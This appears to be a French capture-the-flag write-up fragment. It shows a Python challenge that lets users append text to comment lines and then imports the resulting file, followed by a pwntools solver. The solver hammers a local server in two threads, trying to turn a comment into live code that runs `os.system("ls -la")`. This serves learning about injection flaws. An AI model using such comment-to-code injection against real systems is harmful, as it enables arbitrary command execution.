```py -cwn
import string

source = """#!/usr/bin/env python3 
# Nous aimerions presenter nos excuses pour la situation ci-dessous.
# Comme vous le savez, en python il faut suivre le zen de python.
# Pour rafraichir votre memoire, voici les lignes importantes :
\"\"\"
Beautiful is better than ugly.
Explicit is better than implicit.
Simple is better than complex.
Complex is better than complicated.
Flat is better than nested.
\"\"\"

# Securite extra, aucune execution:
quit()

def wish_printer():
    # 
    wish = 'Kalmar says' + ' cheers!!'
    print(wish)
"""

lines = source.split('\n')

ALLOWED_CHARACTERS = string.ascii_letters + string.digits + string.punctuation + ' '

# Parcourir les lignes et laisser l'utilisateur editer les commentaires:
for i, line in enumerate(lines):
    if i == 0: # On ignore la ligne shebang bien sur
        continue
    if not line.lstrip().startswith('#'):
        continue
    print(f'La ligne {i} est un commentaire. Actuellement: `{line}`. Que veux-tu ajouter?')
    user_input = input('> ')
    if not all(c in ALLOWED_CHARACTERS for c in user_input):
        print('Pas de caracteres bizarres! On veut des commentaires lisibles!')
        continue
    new_line = line + user_input
    if len(new_line) > 72:
        print('Commentaire trop long! Suivez PEP-8!')
        continue
    lines[i] = new_line

# Ecrire le nouveau fichier
new_python_file = '\n'.join(lines)
with open('commented_code.py', 'w') as wf:
    wf.write(new_python_file)

print(f"\nCode ecrit avec succes. Voici le code:\n```\n{new_python_file}\n```\n")

# Verifier que le fichier n'est pas casse:
try:
    __import__('commented_code')
except SyntaxError as e:
    print('SyntaxError:', str(e))
    quit()

print('Yay, pas d erreurs! Merci pour les commentaires!')
```

#### Peut etre pwn

```py -cwn
from pwn import *
import threading

payload1 = ['ding:hz', 'AAAAAA', 'AAAAA', 'ABCDEAAAAAAAAAAAAAAAAAAA', 'ABCDEFGHIJKLMAAAAAAAAAAAAAAAAA~', 'Aif __import__("os").system("ls -la") and True:']
payload2 = ['ding:hz', '~', '~', '', '~', 'asdfasdf']

def connect():
    return process(['python3', './server.py'], level='error')

def spam1():
    att = 0
    while True:
        att += 1
        if att % 100 == 0:
            print('thread1', att)
        conn = connect()
        for v in payload1:
            conn.sendline(v.encode())
        res = conn.recvuntil(b'Thanks').decode()
        if 'total' in res:
            print(res)
            exit()
        conn.close()

def spam2():
    att = 0
    while True:
        att += 1
        if att % 100 == 0:
            print('thread2', att)
        conn = connect()
        for v in payload2:
            conn.sendline(v.encode())
        res = conn.recvuntil(b'Thanks').decode()
        if 'total' in res:
            print(res)
            exit()
        conn.close()

thread1 = threading.Thread(target=spam1)
thread2 = threading.Thread(target=spam2)

thread1.start()
thread2.start()

thread1.join()
thread2.join()
```
